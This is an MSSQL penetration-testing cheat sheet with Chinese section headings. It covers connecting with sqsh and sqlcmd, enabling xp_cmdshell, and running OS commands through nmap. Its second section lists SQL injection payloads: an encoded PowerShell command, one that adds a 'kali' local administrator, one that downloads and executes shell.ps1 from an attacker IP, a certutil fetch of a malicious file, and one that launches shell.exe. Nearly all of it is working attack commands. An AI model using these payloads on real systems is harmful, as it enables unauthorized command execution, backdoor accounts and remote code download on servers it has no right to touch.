## 工具

```bash
sqsh -S <ip> -U sa -P <passwd>
1> exec master..xp_cmdshell 'whoami'
2> go

SELECT name FROM master.dbo.sysdatabases #Get databases
go
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES; #Get table names
go

1> EXEC SP_CONFIGURE 'xp_cmdshell' , 1
2> reconfigure
3> go

1> xp_cmdshell 'whoami'
2> go
nt authority\system

cmd> sqlcmd -S myServer -d myDB -E -Q "select col1, col2, col3 from SomeTable" -o "MyData.txt"


nmap -p <PORT> --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PASSWORD>,ms-sql-xp-cmdshell.cmd="<command>" <IP>
```

## 开启xp_cmdshell

```bash
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;

# 注入命令执行
';EXEC master.dbo.xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOA...';--
'EXEC master..xp_cmdshell 'net user /add kali 1234 && net localgroup administrators /add kali';--
'EXEC master..xp_cmdshell "powershell IEX(New-Object Net.webclient).downloadString('http://<ATTACKER-IP>/shell.ps1')"--
'EXEC master..xp_cmdshell "certutil.exe -urlcache -split -f http://<ATTACKER-IP>/maliciousfile"--
'EXEC master..xp_cmdshell "powershell Start-Process c:\ftproot\shell.exe"--
```
